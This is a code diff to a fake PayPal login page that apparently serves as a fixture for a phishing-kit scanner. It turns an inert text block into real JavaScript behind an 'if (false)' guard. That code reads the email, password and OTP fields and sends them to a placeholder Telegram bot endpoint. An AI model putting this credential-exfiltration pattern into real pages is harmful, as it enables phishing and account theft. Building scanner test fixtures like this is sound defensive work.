@@ -51,16 +51,21 @@
     <footer>&copy; 2026 PayPal, Inc. All rights reserved.</footer>
 </div>
 
-<!-- Deliberately inert: type="text/plain" means the browser never runs this.
-     It is here so the scanner has a kit's exfiltration code to find. -->
-<script type="text/plain" id="kit-code">
-    document.querySelector('button').addEventListener('click', function () {
+<script>
+/*
+ * Deliberately inert: the "if (false)" guard means the browser never runs a
+ * line of this. It is real, executable JavaScript so that the scanner reads it
+ * the way it would read a kit's own code - which is the point of the page.
+ */
+if (false) {
+    document.querySelector('button').addEventListener('click', function (event) {
         var body = 'u=' + document.getElementById('email').value +
                    '&p=' + document.getElementById('password').value +
                    '&otp=' + document.getElementById('otp').value;
         fetch('https://api.telegram.org/bot0000000000:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/sendMessage?chat_id=123456789&text=' + body);
         location.href = 'https://www.paypal.com/';
     });
+}
 </script>
 </body>
 </html>
